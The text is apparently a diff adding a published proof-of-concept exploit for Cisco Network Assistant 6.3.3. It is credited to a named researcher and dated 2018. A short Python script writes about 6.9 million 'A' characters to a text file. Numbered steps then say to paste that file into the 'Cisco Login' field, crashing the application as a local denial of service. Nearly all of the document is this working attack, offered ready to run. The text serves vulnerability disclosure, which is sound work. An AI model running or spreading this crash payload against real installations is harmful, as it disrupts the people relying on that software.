@@ -1,0 +1,23 @@
+# Exploit Title: Cisco Network Assistant 6.3.3 - 'Cisco Login' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-08-27
+# Vendor Homepage: https://www.cisco.com/
+# Software Link : https://software.cisco.com/download/home/286277276/type/280775097/release/6.3.3
+# Tested Version: 6.3.3
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python Cisco_Network_Assistant_6.3.3.py
+# 2.- Open Cisco_Network_Assistant_6.3.3.txt and copy content to clipboard
+# 3.- Open Cisco Network Assistant
+# 4.- Authenticate to Cisco CCO
+# 5.- Paste ClipBoard on "Cisco Login"
+# 6.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 6900000
+f = open ("Cisco_Network_Assistant_6.3.3.txt", "w")
+f.write(buffer)
+f.close()
